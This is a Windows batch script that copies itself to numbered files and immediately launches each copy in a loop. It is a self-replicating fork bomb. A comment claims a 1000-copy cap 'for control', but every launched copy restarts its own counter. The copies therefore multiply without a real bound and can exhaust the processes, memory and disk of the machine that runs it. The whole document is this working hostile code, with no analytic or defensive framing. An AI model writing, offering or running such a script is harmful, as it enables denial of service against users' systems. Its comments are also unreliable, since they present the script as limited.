@echo off
setlocal

:: Set the maximum number of copies (for control)
set /a maxcopies=1000
set /a count=0

:: Replicate itself with no delay
:loop
set /a count+=1
set "newfile=replica_%count%.bat"

:: Copy itself to a new file
copy "%~f0" "%newfile%" >nul

:: Call the next copy immediately (faster replication)
start "" "%newfile%"

:: Stop replication after maxcopies
if %count% GEQ %maxcopies% exit

:: Repeat the process
goto loop
